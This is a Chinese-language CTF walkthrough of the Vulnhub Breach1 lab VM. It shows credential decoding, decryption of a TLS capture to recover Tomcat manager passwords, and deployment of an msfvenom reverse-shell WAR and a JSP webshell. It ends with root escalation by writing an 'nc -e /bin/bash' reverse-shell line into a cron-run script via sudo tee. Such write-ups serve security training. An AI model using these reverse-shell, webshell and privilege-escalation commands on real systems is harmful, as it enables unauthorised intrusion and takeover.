---
title: Vulnhub-Breach1
---

# Vulnhub—Breach1

## Vulnhub简介

Vulnhub是一个提供各种漏洞环境的靶场平台，供安全爱好者学习渗透使用，大部分环境是做好的虚拟机镜像文件，镜像预先设计了多种漏洞，需要使用VMware或者VirtualBox运行。每个镜像会有破解的目标，大多是Boot2root，从启动虚机到获取操作系统的root权限和查看flag。网址：https://www.vulnhub.com

## 靶机信息

### 下载链接

https://download.vulnhub.com/breach/Breach-1.0.zip

### 靶机说明

Breach1.0是一个难度为初级到中级的BooT2Root/CTF挑战。

VM虚机配置有静态IP地址（192.168.110.140），需要将虚拟机网卡设置为host-only方式组网。

### 目标

Boot to root：获得root权限，查看flag。

### 运行环境

靶机：网络连接方式设置为主机模式（host-only），静态IP是192.168.110.140。

攻击机：kali linux,IP为192.168.110.128

## 信息收集

### 端口扫描

使用nmap扫描端口，并做服务识别和深度扫描（加-A参数），扫描结果保存到Breach.txt文件

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/Breach1.0-1.png)

发现端口几乎全开放了，说明该目标对端口扫描做了一些防护措施，直接访问80端口，进入web首页：`http://192.168.110.140/`

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/Breach1.0-2.png)

## 渗透阶段

### F12审计并解码

查看首页源码，发现提示：`Y0dkcFltSnZibk02WkdGdGJtbDBabVZsYkNSbmIyOWtkRzlpWldGbllXNW5KSFJo` 这是一串base64编码。

解码后发现还是base64编码，继续base64解码，得到`pgibbons:damnitfeel$goodtobeagang$ta`

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/Breach1.0-2.1.png)

### 登录到impress cms

1、点击首页的图片，进入`initech.html`，点击`initech.html`左边的`Employee portal`进入到`http://192.168.110.140/impresscms/user.php` ，然后使用上面base64解码得到的用户名密码登录impresscms。

2、到[exploit-db.com](https://www.exploit-db.com/)查找impress cms漏洞：发现ImpressCMS 1.3.9 SQL注入漏洞：`https://www.exploit-db.com/exploits/39737/`，可注入页面为`/modules/profile/admin/field.php

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/Breach1.0-3.png)

但是该页面目前没有权限访问，无法进行注入。

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/Breach1.0-4.png)

3、注意左边的收件箱Inbox显示有3封邮件，依次打开看：

第1封邮件，主要内容：让你的团队只能向管理门户发布任何敏感的内容。我的密码非常安全，发自ImpressCMS Admin Bill。

第2封邮件，主要内容：Michael采购了IDS/IPS。

第3封邮件，主要内容：有一个peter的SSL证书被保存在192.168.110.140/.keystore

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/Breach1.0-5.png)

4、访问`http://192.168.110.140/.keystore`下载包含SSL证书的密钥库keystore文件(keystore是存储公私密钥的一种文件格式)

### 导入PCAP、SSL证书到Wireshark

1、依次访问左边每个菜单栏

content链接了一张图片troll.gif：点击profile会进入网站目录浏览

2、点击`View Account`菜单进入界面，再依次点击页面的`Content`，会弹出一行链接`Content SSL implementation test capture`

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/Breach1.0-6.png)

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/Breach1.0-7.png)

访问链接并下载该文件，并翻译该页面可得提示：这个PCAP文件是有红色团队的重新攻击产生的，但是不能读取文件。而且`They told me the alias, storepassword and keypassword are all set to 'tomcat'`别名、Keystore密码、key密码都设置成`tomcat`。

由以上可得：其一这是一个流量包文件，不能读取很可能因为某些流量有SSL加密并且前面的邮件中提供了一个keystore，这里提供了密码；其二系统中可能存在tomcat。

3、从keystore中获取SSL的证书

Windows攻击机安装有JDK，到JDK目录下找到keytool.exe工具：路径C:\Program Files\Java\jdk-15.0.2\bin\keytool.exe

将keystore放到C盘根目录，查看keystore这个密钥库里面的所有证书，命令`keytool -list -keystore c:\keystore` 输入密钥库口令tomcat

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/Breach1.0-9.png)

从密钥库导出.p12证书，将keystore拷贝到keytool目录，导出名为：`tomcatkeystore.p12`的证书，(如果因为C盘权限问题无法导出，则把上一步的keystore放到D盘即可)命令：
`keytool -importkeystore -srckeystore d:\keystore -destkeystore d:\tomcatkeystore.p12 -deststoretype PKCS12 -srcalias tomcat`

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/Breach1.0-8.png)

4、将.p12证书导入Wireshark

.p12证书存储在C盘根目录，将证书导入Wireshark：在Wireshark中打开_SSL_test_phase1.pcap流量包文件，选择菜单：编辑--首选项--Protocols--SSL，点击右边的Edit：输入：192.168.110.140 8443 http 点击选择证书文件 输入密码tomcat

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/Breach1.0-10.png)

### 得到tomcat后台URL和密码

1、导入证书后，成功解密https流量，查看流量包

a.一个`Unauthorized`的认证包；b.攻击者上传了两张图片，疑似图片马，但是命令马无法直接访问，需要登录tomcat后台；c.有cmd命令马执行了id命令。

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/Breach1.0-14.png)

2、获得Tomcat后台登录地址和用户名密码

通过上面发现的一个Unauthorized的认证包，该request和response包含了Tomcat后台的登录地址：`https://192.168.110.140:8443/_M@nag3Me/html`因为状态码为200，进一步发现包含登录用户名密码的数据包， 采用http basic认证，认证数据包为：Basic dG9tY2F0OlR0XDVEOEYoIyEqdT1HKTRtN3pC
Tomcat后台登录用户名：tomcat，密码：Tt\5D8F(#!*u=G)4m7zB

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/Breach1.0-12.png)

3、登录tomcat

访问上面的登录地址发现无法访问

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/Breach1.0-13.png)

这里是因为浏览器不具备相应的证书所导致的，这里可以用burp代理拦截，然后放包访问，因为burp具备各种证书。也可以在浏览器中进入about:config并添加字符串security.tls.insecure_fallback_hosts 192.168.110.140，便可成功访问。这里我推荐后者，因为每次操作都要放包太麻烦了。

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/Breach1.0-16.png)

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/Breach1.0-17.png)

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/Breach1.0-15.png)

### ‘养马场’Tomcat后台getshell

 Tomcat后台get shell的标准姿势：上养马场，准备好jsp版本的各种马，然后上传连接。

1、这里我直接用kali的msfvenom生成反弹shell的zhiji.war，然后再将自己的祖传jspspy大马添加进去，然后将zhijiya.war包上传部署即可

```shell
msfvenom -p java/jsp_shell_reverse_tcp lhost=192.168.110.128 lport=8989 -f war -o zhijiya.war 
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/Breach1.0-32.png)

2、开启监听

```shell
use exploit/multi/handler
set payload java/jsp_shell_reverse_tcp 
set lhost 192.168.110.128
set lport 8989
run
```

3、访问上传的war

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/Breach1.0-18.png)

反弹成功后，输入命令`python -c 'import pty;pty.spawn("/bin/bash")'`得到bash模式，最后得到shell,并尝试登录mysql,结果直接免密成功登录

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/Breach1.0-19.png)

### 提权到用户milton和blumbergh

1、查看用户名和密码`select user,password from user;`得到milton用户的密码哈希，[md5解密](https://hashes.com/en/decrypt/hash
)即可

`milton:thelaststraw`

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/Breach1.0-21.png)

到用户名密码后提权到用户milton，su milton

2、查看milton用户home目录下的some_script.sh文件，没有可利用的信息。

3、查看系统内核版本，命令`uanme -a`和`cat /etc/issue`

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/Breach1.0-22.png)

系统内核版本为：Linux Breach 4.2.0-27-generic，不存在Ubuntu本地提权漏洞。存在本地提权漏洞内核版本是：Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04)

4、查看历史命令，看到历史命令su提权到了blumbergh用户。需要找到blumbergh用户的密码。

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/Breach1.0-23.png)

到现在发现了7张图片，6张在图片目录：http://192.168.110.140/images/，一张在milton用户目录下：

http://192.168.110.140/images/bill.png

http://192.168.110.140/images/initech.jpg

http://192.168.110.140/images/troll.gif

http://192.168.110.140/images/cake.jpg

http://192.168.110.140/images/swingline.jpg

http://192.168.110.140/images/milton_beach.jpg

milton用户目录下my_badge.jpg

6、strings打印各图片其中的可打印字符，追加输出到images.txt，在vim下查看，密码在bill.png图片中。找到可能的密码或提示：发现唯一的单词是：coffeestains

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/Breach1.0-33.png)

或者使用exiftool.exe工具查看bill.png图片的exif信息，得到可能的密码：coffeestains

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/Breach1.0-24.png)

成功提权到blumbergh用户：blumbergh:coffeestains

7、并查看历史命令，发现/usr/share/cleanup和tidyup.sh脚本文件

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/Breach1.0-25.png)

查看tidyup.sh脚本

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/Breach1.0-26.png)

这是一段清理脚本，描述中说明每3分钟执行清理，删除webapps目录下的文件，因此之前上传的菜刀马总是被删除，需要重新上传。查看`tidyup.sh`的权限，对该脚本没有写入权限，只有root可以

8、查看sudo权限，执行`sudo -l`：发现用户能够以root权限执行这tee程序或tidyup.sh脚本：`/usr/bin/tee`和`/usr/share/cleanup/tidyup.sh`

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/Breach1.0-27.png)

ps：tee命令用于读取标准输入的数据，并将其内容输出成文件。tidyup.sh是清理脚本。

### 通过crontab的计划任务，反弹root shell

1、向tidyup.sh中写入反弹shell命令

tidyup.sh文件只有root可写，而能够以root权限运行tee命令，那么用tee命令写tidyup.sh：先将反弹shell命令写入shell.txt文件，使用bash反弹shell命令没有成功，于是使用nc命令反弹shell成功，所以写nc反弹命令：
`echo "nc -e /bin/bash 192.168.110.128 4444" > shell.txt`
再使用tee命令将shell.txt内容输出到tidyup.sh
`cat shell.txt | sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh`
查看tidyup.sh文件写入成功：`cat /usr/share/cleanup/tidyup.sh`

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/Breach1.0-28.png)

2、nc监听等待反弹shell，因为是定时任务所有，这里需要等待3分钟执行反弹，查看权限是root，flag是一张图片,将图片拷贝到home目录：

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/Breach1.0-29.png)

3、 使用之前上传的jsp大马JspSpy将flair.jpg下载到Windows：

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/Breach1.0-30.png)

4、查看flag：I NEED TO TALK ABOUT YOUR FLAIR 游戏通关。

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/Breach1.0-31.png)